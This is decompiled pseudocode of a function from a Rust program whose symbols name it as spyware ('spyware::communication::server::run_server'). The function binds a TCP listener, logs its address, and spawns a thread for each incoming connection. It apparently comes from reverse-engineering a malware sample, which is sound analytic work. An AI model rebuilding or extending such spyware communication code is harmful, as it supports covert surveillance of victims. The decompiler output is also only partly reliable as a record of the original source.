__int64 __fastcall spyware::communication::server::run_server(__int16 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rcx
  __int64 v8; // rax
  __int64 v9; // rax
  unsigned int v11; // [rsp+4h] [rbp-114h] BYREF
  unsigned int v12; // [rsp+8h] [rbp-110h] BYREF
  __int16 v13; // [rsp+Eh] [rbp-10Ah] BYREF
  __int128 v14; // [rsp+10h] [rbp-108h] BYREF
  __int128 v15; // [rsp+20h] [rbp-F8h]
  __int64 v16; // [rsp+30h] [rbp-E8h]
  unsigned int *v17; // [rsp+38h] [rbp-E0h] BYREF
  char **v18; // [rsp+40h] [rbp-D8h] BYREF
  __int64 v19; // [rsp+48h] [rbp-D0h]
  unsigned int ***v20; // [rsp+50h] [rbp-C8h]
  __int64 v21; // [rsp+58h] [rbp-C0h]
  __int64 v22; // [rsp+60h] [rbp-B8h]
  char v23; // [rsp+68h] [rbp-B0h]
  unsigned int **v24; // [rsp+70h] [rbp-A8h] BYREF
  __int64 (__fastcall *v25)(); // [rsp+78h] [rbp-A0h]
  __int128 v26; // [rsp+80h] [rbp-98h] BYREF
  __int128 v27; // [rsp+90h] [rbp-88h]
  _OWORD v28[3]; // [rsp+A0h] [rbp-78h] BYREF
  _BYTE v29[72]; // [rsp+D0h] [rbp-48h] BYREF

  v13 = a1;
  *(_QWORD *)&v14 = &off_B8D10;
  *((_QWORD *)&v14 + 1) = <&T as core::fmt::Display>::fmt;
  *(_QWORD *)&v15 = &v13;
  *((_QWORD *)&v15 + 1) = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;
  v18 = (char **)&unk_B8CA0;
  v19 = 2LL;
  v22 = 0LL;
  v20 = (unsigned int ***)&v14;
  v21 = 2LL;
  core::option::Option<T>::map_or_else(v29, &v18);
  std::net::tcp::TcpListener::bind(&v18, v29);
  if ( ((unsigned __int8)v18 & 1) == 0 )
  {
    v12 = HIDWORD(v18);
    std::net::udp::UdpSocket::local_addr(v28, &v12);
    if ( LOWORD(v28[0]) == 2 )
    {
      v17 = (unsigned int *)*((_QWORD *)&v28[0] + 1);
      if ( core::sync::atomic::atomic_load(v28, &v12, v2, v3) )
      {
        v24 = &v17;
        *(_QWORD *)&v26 = &v24;
        *((_QWORD *)&v26 + 1) = <&T as core::fmt::Display>::fmt;
        v18 = &off_B8CD0;
        v19 = 2LL;
        v22 = 0LL;
        v20 = (unsigned int ***)&v26;
        v21 = 1LL;
        v4 = log::__private_api::loc(&off_B8D38);
        *(_QWORD *)&v14 = aSpywareCommuni;
        *((_QWORD *)&v14 + 1) = 30LL;
        *(_QWORD *)&v15 = aSpywareCommuni;
        *((_QWORD *)&v15 + 1) = 30LL;
        v16 = v4;
        log::__private_api::log(&v18, 1LL, &v14);
      }
      core::ptr::drop_in_place<std::io::error::Error>(&v17);
    }
    else
    {
      v27 = v28[1];
      v26 = v28[0];
      if ( (unsigned __int64)core::sync::atomic::atomic_load(v28, &v12, v2, v3) >= 3 )
      {
        v24 = (unsigned int **)&v26;
        v25 = <core::net::socket_addr::SocketAddr as core::fmt::Debug>::fmt;
        v18 = &off_B8CC0;
        v19 = 1LL;
        v22 = 0LL;
        v20 = &v24;
        v21 = 1LL;
        v5 = log::__private_api::loc(&off_B8D20);
        *(_QWORD *)&v14 = aSpywareCommuni;
        *((_QWORD *)&v14 + 1) = 30LL;
        *(_QWORD *)&v15 = aSpywareCommuni;
        *((_QWORD *)&v15 + 1) = 30LL;
        v16 = v5;
        log::__private_api::log(&v18, 3LL, &v14);
      }
    }
    v17 = &v12;
    while ( 1 )
    {
      while ( 1 )
      {
        <std::net::tcp::Incoming as core::iter::traits::iterator::Iterator>::next(&v24, &v17);
        if ( !(_DWORD)v24 )
          break;
        if ( (_DWORD)v24 != 1 )
          std::panicking::begin_panic(aServerClosedUn, 26LL, &off_B8D50);
        *(_QWORD *)&v28[0] = v25;
        if ( core::sync::atomic::atomic_load(&v24, &v17, v6, v7) )
        {
          *(_QWORD *)&v26 = v28;
          *((_QWORD *)&v26 + 1) = <std::io::error::Error as core::fmt::Display>::fmt;
          v18 = &off_B8D00;
          v19 = 1LL;
          v22 = 0LL;
          v20 = (unsigned int ***)&v26;
          v21 = 1LL;
          v8 = log::__private_api::loc(&off_B8D98);
          *(_QWORD *)&v14 = aSpywareCommuni;
          *((_QWORD *)&v14 + 1) = 30LL;
          *(_QWORD *)&v15 = aSpywareCommuni;
          *((_QWORD *)&v15 + 1) = 30LL;
          v16 = v8;
          log::__private_api::log(&v18, 1LL, &v14);
        }
        core::ptr::drop_in_place<std::io::error::Error>(v28);
      }
      v11 = HIDWORD(v24);
      if ( (unsigned __int64)core::sync::atomic::atomic_load(&v24, &v17, v6, v7) >= 3 )
      {
        std::net::tcp::TcpStream::peer_addr(&v14, &v11);
        if ( (_WORD)v14 == 2 )
        {
          v1 = *((_QWORD *)&v14 + 1);
          core::ptr::drop_in_place<std::net::tcp::TcpStream>(v11);
          core::ptr::drop_in_place<std::net::tcp::TcpStream>(v12);
          return v1;
        }
        v26 = v14;
        v28[2] = v15;
        v27 = v15;
        *(_QWORD *)&v28[0] = &v26;
        *((_QWORD *)&v28[0] + 1) = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
        v18 = &off_B8CF0;
        v19 = 1LL;
        v22 = 0LL;
        v20 = (unsigned int ***)v28;
        v21 = 1LL;
        v9 = log::__private_api::loc(&off_B8D68);
        *(_QWORD *)&v14 = aSpywareCommuni;
        *((_QWORD *)&v14 + 1) = 30LL;
        *(_QWORD *)&v15 = aSpywareCommuni;
        *((_QWORD *)&v15 + 1) = 30LL;
        v16 = v9;
        log::__private_api::log(&v18, 3LL, &v14);
      }
      v20 = (unsigned int ***)0x8000000000000000LL;
      v18 = 0LL;
      v23 = 0;
      std::thread::Builder::spawn_unchecked(&v14, &v18, v11);
      core::result::Result<T,E>::expect(&v18, &v14);
      core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>(&v18);
    }
  }
  return v19;
}